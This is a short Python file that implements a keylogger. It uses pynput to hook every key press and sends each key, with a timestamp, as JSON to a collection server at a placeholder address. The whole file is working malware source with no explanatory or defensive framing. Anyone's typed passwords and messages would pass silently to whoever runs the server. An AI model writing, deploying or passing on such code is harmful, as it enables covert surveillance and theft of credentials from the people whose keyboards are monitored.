from pynput.keyboard import Listener
import requests
import time

SERVER_ADDR = 'http://0.0.0.0:5000/'


def handle_press(key):
    resp = requests.post(SERVER_ADDR, json={
                         'key': str(key), 'time': time.time()})


with Listener(handle_press) as listener:
    listener.join()
